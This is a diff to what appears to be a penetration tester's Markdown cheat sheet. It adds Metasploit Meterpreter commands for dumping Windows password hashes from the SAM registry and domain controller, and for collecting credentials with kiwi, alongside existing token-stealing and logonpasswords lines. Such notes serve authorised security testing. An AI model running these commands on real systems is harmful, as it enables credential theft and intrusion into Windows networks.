@@ -1,5 +1,12 @@
 # hashdump
+
+## Pull from Registry(SAM and Syskey)
 - hashdump 
+- run hashdump 
+## Pull Disk both DC and SAM 
+- run post/windows/gather/smart_hashdump
+## Pull from Registry 
+- run post/windows/gather/hashdump 
 
 # extapi
 - steal_token (to use domain creds)
@@ -24,3 +31,4 @@
 - load kiwi
 - creds_kerberos
 - kiwi_cmd sekurlsa::logonpasswords
+- creds_all 
